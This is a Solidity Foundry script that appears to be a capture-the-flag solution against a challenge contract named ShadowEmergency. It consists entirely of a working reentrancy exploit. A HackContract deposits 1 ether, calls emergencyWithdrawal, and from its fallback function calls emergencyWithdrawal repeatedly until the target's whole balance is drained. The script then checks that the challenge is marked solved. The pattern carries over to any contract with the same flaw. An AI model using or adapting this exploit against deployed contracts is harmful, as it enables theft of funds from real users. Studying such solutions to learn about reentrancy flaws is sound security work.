pragma solidity 0.8.28;

import "forge-std/Script.sol";

interface ISetup {
    function shadowEmergency() external view returns (address);
    function isSolved() external view returns (bool);
}

interface IShadowEmergency {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
    function checkBalance() external view returns (uint256);
    function transfer(address _to, uint256 _amount) external;
    function emergencyWithdrawal() external;
}

contract Solve is Script {
    function run() public {
        ISetup setup = ISetup(vm.envAddress("SETUP"));
        IShadowEmergency shadowEmergency = IShadowEmergency(
            setup.shadowEmergency()
        );

        vm.startBroadcast(vm.envUint("PRIV"));
        address user = vm.addr(vm.envUint("PRIV"));

        HackContract hackContract = new HackContract();
        hackContract.hack{value: 1 ether}(shadowEmergency);

        require(setup.isSolved());
        vm.stopBroadcast();
    }
}

contract HackContract {
    IShadowEmergency public shadowEmergency;

    function hack(IShadowEmergency _shadowEmergency) public payable {
        shadowEmergency = _shadowEmergency;
        shadowEmergency.deposit{value: 1 ether}();
        shadowEmergency.emergencyWithdrawal();
    }

    fallback() external payable {
        while (address(shadowEmergency).balance != 0) {
            shadowEmergency.emergencyWithdrawal();
        }
    }
}
